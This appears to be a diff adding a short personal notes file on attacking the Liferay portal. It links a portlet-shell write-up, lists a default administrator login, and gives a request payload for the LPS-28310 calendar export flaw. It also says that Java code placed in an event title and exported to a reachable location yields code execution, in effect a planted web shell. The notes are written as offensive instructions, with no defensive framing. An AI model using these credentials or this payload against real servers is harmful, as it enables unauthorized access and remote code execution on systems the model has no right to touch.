@@ -1,0 +1,11 @@
+# liferay
+
+http://www.insinuator.net/2011/12/liferay-portlet-shell/
+
+# admin / deballer la guerre
+default account: test@liferay.com / test 
+
+# hack liferay calendar using https://issues.liferay.com/browse/LPS-28310
+payload is something like
+groupId=10138&fileName=te&serviceClassName=com.liferay.portlet.calendar.service.CalEventServiceUtil&serviceMethodName=exportGroupEvents&serviceParameters=%5B%22groupId%22%2C%22fileName%22%5D&doAsUserId=
+you need to create an event with some java code in the title and export it somewhere you can access it
